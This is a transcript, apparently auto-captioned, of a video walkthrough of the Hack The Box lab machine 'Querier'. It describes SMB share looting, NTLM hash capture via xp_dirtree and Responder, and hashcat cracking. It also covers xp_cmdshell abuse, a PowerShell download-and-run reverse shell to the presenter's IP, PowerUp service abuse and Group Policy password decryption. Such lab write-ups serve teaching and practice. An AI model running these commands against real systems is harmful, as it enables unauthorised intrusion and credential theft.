 what's going on YouTube this is hip sack and we're doing quer√≠a from active box which was a relatively fun and easy box that didn't even have a web server it starts off with finding a open SMB share that has an Excel document on it you pull down the Excel document to extract a username and password that's in a macro use that to connect to the Microsoft sequel database and notice that XP CMD shell is disabled but you can do a dirt tree to call back to you in order to steal the hash that the Microsoft sequel service account is using to run the service crack the hash log back into this box and then you can enable XP CMD shell which then lets you get a low privileged shell on the box with that show you can just draw and power up and discover that group policy cache credentials on it which has the administrator password pretty much in clear-text so let's jump in as always we're going to start off with the end map so - SC for default scripts as V enumerate versions Oh a output or format spin the end map directory and call it query ER and then the IP address which is 10 10 10 125 can take some time to run so I've already ran it looking at the results we have a handful of ports open the first thing we have is MSRP C which is Microsoft from a procedural call on port 135 net buyers on 139 this Microsoft - DS on port 445 which essentially is samba or SMB then we have Microsoft sequel server on port 1433 just based upon the port's there is one thing that's missing from many HTTP boxes and we don't have a web server to attack so maybe we missed a port someone do a full ports game with nmap - P - that does ports 1 through 65535 and oay I'll call this all ports after a few verbose flags in there so it shows me the open ports as it does find them I'm not going to do any scripts just because I want this to go pretty quick and normally I don't do you full UDP scans but I will run a SNMP check in this so SNMP check 10 10 10 125 and if it is open we may just get port listings from SNMP so with that going on let's go back over to the end map and review the script output because it did run on Microsoft sequel and we have the domain name which is htb local the box's name and then we also have this product build version so I'm gonna search this to get a rough idea of where the patches are on this box so we just searched 17 763 all I mcdougal and then go to Windows 10 version history and search this page and we see it is related to version 1809 and its release date was November 13th 2018 now this doesn't mean this was the last patch installed it's just the last time maybe it's the kernel where the code name has been updated I don't know exactly what build or what the technical term is but this isn't the hotfix so hot fixes could have installed after November 13 2018 but any exploit prior to this we probably can just disregard so while all those and maps go I don't see any HTTP ports these are just ephemeral ports that Windows normally listens on SNMP didn't really find anything so I'm gonna start looking at port 445 we could look at Microsoft sequel but normally in order to get access to sequel we need some type of credential so let's go look at what is on port 4 4 or 5 let's run SMB map - capital H to specify the host then 10 10 10 125 and this is gonna fail just like it did in sizzle and in sizzle I gave up and did SMB client - and - capital L on 10 10 10 125 and that's how I listed the shares but the goose Tom pointed out in a youtube comment that if I specified specified anonymous as the user with SMB map it would work so we can do SMB map - capital H 10 10 10 125 - you anonymous and hit enter well finding your open ports and it lists things this doesn't always work for some weird reason you may have to specify the domain if you specify HT be local you will find that there are no log line servers and that's because this box cannot talk to the HTTP local because it doesn't exist so put the domain as like localhost if you get error messages and it should work and the reason why I like SMB map over SMB client let's see if I can show it easily on the screen we have SMB clients output on the left here and we just have share name and comment SMB map tells us the access we have so it's telling us we have access to read the IPC and reports directory reports is non-standard so someone created that so let's go dig into that to do that I am gonna run SMB client and before I do that I'm going to run make duress mb and i'm gonna move all these and map stuff into the end map directory there we go and now let's just do SMB client - no dashes - capital N and then slash slash 10 10 10 125 slash reports so let's connect to the share come on there we go do a LS and we see a file the currency volume report dot XLS M which is a Excel macro file so I'm going to do a get against this file I'm going to copy it paste and we have downloaded it so we have an Excel macro file and americo just means it has the M and if it was just a I think XLS it doesn't mean that this doesn't have a macro so fix all these extensions are weird I'll just leave it at that the tool I normally use to go and examine this is called I think oh well evb a let's see oh le VBA github yep here it is Oh le tools so let's copy this and do a git clone and I also want to do app search just to make sure this is not in the callee repo and actually it looks like it is so let's do app to install Python Oh Ellie tools first and see if this gives us that package and I suppose before I ran this okay I don't have it installed I just want to make sure I didn't have it already before I install this package so we'll find out if it installs it and I guess well app goes we can do less and map all ports dot add map and look at what is listening and we have when RM and the rest looks like it ephemeral ports we could do a script scan against all of these but I'm gonna go with probably not going to be a webserver listening on that high of a port but that baggage is still installing so let's just go do it so I'm gonna go into the end map directory I'm gonna cat all ports dot and map now we'll grab for anything that begins with a number 0 to 9 and now I'm gonna do an O to split it on slash print every the very first match so it - you to make sure it's unique since there's only one IP it's always gonna be unique but that's it send it to the file called ports and um how do I put these all in one line easily let's just do for I and cat ports do echo - n I comma done now I get a list of all the ports so we can do and map - SCS V - P for port specify the ports and then the IP address which is 10 10 10 125 and I should do - - script script - all ports or not script away there we go so let's see if Olli has finished oh it finished a while ago but I guess T MUX just froze at installing that's embarrassing to have our early tools I do have a le VBA now so we should be able to run o le VBA against currency volume and we can see it's got two suspicious macros it may open a file and some hex cutting was detected so if we scroll up we can see it's going to give us the macro we have VBA this workbook private sub connect and we do a connection to the server querier and then the password is this and the username is let's see u ID for user ID reporting so user names reporting password is this so what I'm going to do is run in packets ms SQL client and if you don't have this tool you can just install it either through Kali if you install it through Kali zapped just to locate m SQL client and then it will be in this examples directory and if you wanted to you can install it off of git and just do pip install period and that should install everything so let's go back to my directory and run ms SQL client and look at the flags we can do so it looks like it's just that python script and then there's a - windows all flag whether or not to use windows authentication default is set to false we got a debug output option and let's see target and target is just username at target name or address so we can do ms SQL client I think it was reporting at 10 10 10 125 and we have to run Oh Ellie again in order to identify the password so copy this paste this in and we get log-in failed and I just made sure the passwords good username reporting UID reporting so West try - windows off try this again and we get in so if we do what's any sequel command let's try show databases cannot find stored procedure show we did help we can see what we can do these are impacted commands so there is one for XP and able or enable XP CMD show if we run it we see we don't have permission to do that so let's try stealing the hash of this service so to do that I'm gonna run responder - I ton 0 and then let's do XP underscore I think it's der tree and then the file share so we'll do 10 10 14 3 which is the IP address of my Kali box we can verify that with just if config tun 0 you can see 10 10 14 3 there any share name because respond Alyssa's to a mole so we say please sub and I forgot the and portation mark and we can see we get the service hash right here so let's copy this and let's SSH to a box where we have hash cat installed again you can do this on your VM and we'll just go slow I recommend doing on your host so let's go v hashes / the machine name dot auntie Lambie to paste this in and then we can do dot slash hash cat and then - - example format example hashes and then just less that net ntlm and find net n tail MV 2 which is mode 5600 so we can just do dot slash hash cat - m 5600 hashes the file and then opt word list rocky text and then we see it has cracked it already so if we go up the password for that is corporate 568 so let's try this out but before we do let's just sure something in responder so if we had done this again we just keep seeing skipping previously captured hash so responder logs everything in a file called responder DB so if you go into this you can just do sqlite3 responder DB I think it's dot schema to list what the tables are and they can do like select star from responder and get the output if you only wanted to see like the hashes you could specify what you wanted so you could do type host name and then full hash I think and we see net auntie LAN V - my host name doesn't matter maybe I mistyped that don't know but there's the hash so if you want to get previous hashes in responder that is how so let's see there's the password and the username was ms SQL SVC so what I'm going to do is SMB map - u ms SQL - sv see - P put the password - D the domain and I'm gonna specify what the domain is for this and then - capital H 10 10 10 125 and we see we have no greater access so if we had seen like admin on C my next step would be to use like PS exact because then we could drop files into admin and whatnot but since we can't write files over SMB I know PS exec would fail the other thing we could potentially think about is doing windows remoting because if we go to that and maps can we add ran and look at script all ports dot and map we see when RM is open or at least I think it is I think it's this 5985 and 47 double 0 1 but let's try connecting to Microsoft sequel with that service account first so let's do that Python command again and then instead it's gonna be the username which is well let's just exit this ms SQL - SVC and get rid of that there we go paste the password in and that's no longer my clipboard so I guess I have to go into my Kraken again - one hash cat slash hash cat pot file grab the password corporate 568 and then login so now on this we can do help again and let's try running XP CMD shell the last time we did this with the reporting account we said all right impact it said it didn't have permission so doing this looks like it did and it says change from 0 to 1 run reconfigure statement - stall I'm not sure if impact it does that automatically so let's just try this XP CMD shell Who am I so it looks like we don't have to run reconfigure and pack it already takes care of that for us so we can run commands on this box now with that XP CMD shell so let's get rid of this responder make a directory dub-dub-dub go in there and then we will copy nishang there so CP opt nishang and this is shells reverse tcp where is it invoked reverse where is it powershell reverse PowerShell tcp ps1 that's the name and we'll just call that reverse ps1 and then edit this file and let's go grab this reverse line hit Y twice for yank capital G to go to the bottom p4 put 5x delete the first five characters and let's change this IP address so that's 3 3 3 that's 12 and 3 so 15s to delete 15 characters 10 10 14 3 and let's change the port to 9001 because that's support I just always use so now let's run Python em simple HTTP server on port 80 and then at cat LVN p on port 9000 1 and let's do XP CMD shell powershell IX new object net dot web client 10 10 10 14 right 10 10 14 three fights is pacify HTTP as well and then reverse dot ps1 try that syntax error see the only slashes I have are in the URL so let's change it to it's missing parentheses so let's xscape these quotes let's see put the whole thing and single quotes does not work and see powershell IX new object oh that's right dart download string I don't know how I missed that whole thing there we go maybe I was just going too fast but I forgot dot download string after that so we get the shell so the one thing I don't like about this show is I don't have up keys we have all this so what I'm going to do is run the program RL rap and you can install that through apt I think before I do that cat LVN P 9001 just on this PowerShell command again and now I have up keys so we can run Who am I and we can see we're query ur / ms SQL - SVC so let's go into let's just run system info first to get an idea of what box were on and let's go to the top and we can see it's a Microsoft Windows Server 2000 19 standard so even if we have the impersonation token impersonation privilege on this it doesn't work on 2019 which is the juicy rot and etc potato and then we have hot fixes installed so let's just grab I don't we grab the highest number and just check this and let's just do a spot check so switch that KB we'll search this one and then the first one January 8th and that is January 22nd January 22nd so this box has been patched around the 1st of 2019 or January 2019 we could do who am i / Prive we see we have se impersonate privilege but that doesn't really get you anything on windows 2019 so what I'm going to do is run power up but before we can run power up we have to copy it into a dub dub dub directory so we do CP up power sploit - dev and then this is under probe ask power up ps1 go over to a reverse shell IX new object net dot web client download string HCP ten ten ten fourteen three power up ps1 and then invoke - all checks and let this run which will take a few minutes so it looks like it finished if we go to the top and search all checks we have it telling us the very first thing is we have the SC impersonate privilege which we went into we can't exploit this because of Windows 2019 we have this service we could potentially abuse because let's see path we could modify it but I don't think we can restart this service so we can try oh we can restart the service so we can try running this and seeing what happens and then let's see we got modifiable path a dll hijack on this Windows app thing but we can't restart this service so in order for DLL highjacked to work you can't just drop the DLL and have it just magically execute the code you have to reboot the Machine reboot the service or do something like that so that's why whenever I see something with these services I am thinking okay can i exploit that and this is in the app store so you may actually be able to do this with so I'm not sure of the top my head unintended filepath nothing there and then we got a group policy object that has a credential my uncle's are Mario and Luigi with the administrator password so we can try that the first thing I want to do is just run this invoke service abuse and then let us restart the service so what service is it USO SVC let's see service abuse command cannot be started so it doesn't look like we can restart service USO SVC maybe it did net user oh it does work we created the user John so just like that I found something I did not know well on this box I didn't think that would work so by default invoke service' Butte creates the user John with the password password 1 2 3 so if we go and do SMB map - you John - P password 1 2 3 - capital H 10 10 10 125 and let's see finding open SMB ports let's do - D the host name and don't think it John to the local administrators net local group administrators he is it doesn't have access over seaville PS exec John at 10 10 10 125 MPs exact PI password 123 huh not exactly sure what's that happening there but let's try that credential we saw and the GPO service so my uncle's are Mario and Luigi paste that in and we can see it's trying to admin and we'll get a shell and if we had done SMB map - you administrator - P password - D hostname H 10 10 10 125 you'll see that this will say administrator has full access over admin and see come on don't make me a liar there we go well readwrite good enough and eventually we should get a show back this box is just going extremely slow so come on give it the prompt once we get this prompt we will dig into exactly what happened with this group policy object and then I'm gonna play with and see if we can get a shell as at John real quick so let's do Who am I and we are empty authority / system so that is how you're supposed to root the box let us go back to here where are we okay so let's go and do this group policy being manually so back in Windows 2000 8 Microsoft thought it was a good idea to let you set local administrator passwords via group policy however when they did that in order to set it it had to be reversible they used a EES and then went and published their AES key so let's see if we can do a quick search a s key group policy Microsoft will this pull it let's see Docs Microsoft there we go and this is the private key to decrypt it so they had published this which then everyone used to be able to decrypt the credentials stored within group policy so you can no longer set that but every now and then you find people that said it a long time ago and it still exists so let's go to a CD backslash program data and let's look at dub dub dub them power up ps1 I want colouring so let's Google them color power she'll see that doesn't look like it see come on there's gotta be syntax highlighting for this see is this for PowerShell let's just try installing this paper color you can do PowerShell syntax highlight vim there we go this is why I wanted them - ps1 so copy this go to tab curl - OH then zip CD home dot them unzip temp them dot zip replace sure and now let's go dub dub dub them para ps1 that was an audio message that's windows formatting got them fine dot - type F okay - exact dose to UNIX and pray this works huzzah we got it so let's do a search for how this does it the first thing I want to do set IC to ignore case and then we'll do GPP so get group policy passwords I don't want this third P stands for so let's see how does this work let's just see what caused this so we've got GP p and i field I think calls it okay let's see what calls GP p and a field so discover any locally cached group policy XML files and it's searching for groups are XML services directs ml scheduled tasks data sources primers and drives and it's going to all users application data or program data so let's go back into our thing we can just do dir slash a slash B find STR group cmd.exe /c dirs be fine sto group there we go we can do a type against this file to print it out get content to print it out get content parentheses to print now there we go so now I put quotes on both ends of that to get to print because it has spaces and group policy so now we got the file we can copy this to our box and then we know we need the shell there so we can call this groups XML set paste paste it in and then let's go and Google Python decrypt GPP there we go raw copy them Dec PI set paste paste it in so usage this and then C password and C password looks like it wants it to be base64 because we're doing a be 64 decode against it so let's just try this WQ cat group start XML name is administrator UID user context C password and a base64 string so let's do Python deck pi paste this in and I get my uncle's are a Mario and Luigi if you look at deck PI we see the key four nine nine zero six e8 going to my excels page 49 nine 6:08 and then 3 3 B 6 6 C 1 B so III b6 1 B so this is exactly how it's working if you want you can analyze this python code to see how it decrypts it but lastly let's figure out how we can get a shell as John now lastly let's figure out how we can prove a squid that One Vulnerable service so we'll do our L ramp netcat LVN p 9001 to set up a shell again watch this XP CMD shell we have to enable it and then launch it again we had to enable it because there's a scheduled task that restarts that every now and then so let's do IX new object net dot web client download string HTTP 10 10 14 3 / powerup ps1 to reload this and then we will do invoke all checks which does take a little bit so we'll just fast forward and now that it's done let's go up and copy this invoke service abuse and if we looked at invoked service abuse we could see there are other things we can do other than just execute it so let's I guess edit anyways and we can do invoke service abuse and where do we see what options we have description and that is over to read let's get rid of sent exiling there something screwed up and voke service there we go so we have parameter command custom command to execute instead of user creation so that's what I'm going to do so let's go up here invoke service abuse the name of the service - command I'm going to do net user administrator please subscribe and put two estimation points so let this run and we'll see if this now works so copy the password go down here SMB Matt - you administrator - Pia put the password in - T for domain query earth - capital H the host name 10 10 10 125 and we have authenticated and can read and write the sieve all and admin vol so let's just do PS exec administrator at 10 10 10 125 need dot py paste in the password and we can now get a shell so the other method obviously better because we're not changing a password I'm sure you could have got around the restriction before I'm not sure why John couldn't read and write seve all and Adam involve being a member of administrators but changing passwords is generally a no-no and something you only do as a last resort you could have also just done a command to execute a file and then that would have given you system so if you just put like I'm meterpreter or whatever executable on the box so that's it I hope you enjoyed the box take care and I will see you all next week